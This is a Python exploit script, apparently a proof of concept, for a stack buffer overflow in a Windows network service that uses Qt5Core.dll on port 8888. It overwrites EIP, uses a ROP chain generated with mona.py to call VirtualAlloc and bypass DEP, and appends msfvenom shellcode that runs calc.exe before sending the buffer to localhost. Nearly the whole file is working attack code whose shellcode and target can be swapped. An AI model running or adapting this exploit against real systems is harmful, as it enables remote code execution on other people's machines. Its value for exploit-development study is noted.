import socket
import struct

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB6\x42\xA8\x68" # 0x68A842B6 -> RET
NOPS       = b"\x90" * 30

#!mona rop -m qt5core.dll -cpb "\x00\x0a\x0d"
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0x690398a0,  # ptr to &VirtualAlloc() [IAT Qt5Core.dll]
      0x68b711c6,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Core.dll] 
      0x68b777f6,  # XCHG EAX,ESI # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x68c88966,  # POP EBP # RETN [Qt5Core.dll] 
      0x68d652e1,  # & call esp [Qt5Core.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x68ae2632,  # POP EDX # RETN [Qt5Core.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x68bd5fe4,  # NEG EDX # RETN 0x0C [Qt5Core.dll] 
      0x68c4a096,  # POP EBX # RETN [Qt5Core.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0xffffffff,  #  
      0x68fa1750,  # INC EBX # RETN [Qt5Core.dll] 
      0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0x6ff9e937,  # put delta into eax (-> put 0x00001000 into edx)
      0x68fbc008,  # ADD EAX,86038743 # ADD AL,83 # ADD EAX,0A029F03 # RETN [Qt5Core.dll] 
      0x68bb687f,  # XCHG EAX,EDX # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x68cef5b2,  # NEG EAX # RETN [Qt5Core.dll] 
      0x68fb862d,  # XCHG EAX,ECX # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x68aee9f3,  # POP EDI # RETN [Qt5Core.dll] 
      0x68cef5b4,  # RETN (ROP NOP) [Qt5Core.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x68b226c5,  # POP EAX # RETN [Qt5Core.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x68a914f5,  # PUSHAD # RETN [Qt5Core.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

ROP = create_rop_chain()

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + ROP + payload))

buf = padding1 + EIP + ROP + NOPS + payload + overrun

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,8888))
s.send(buf)
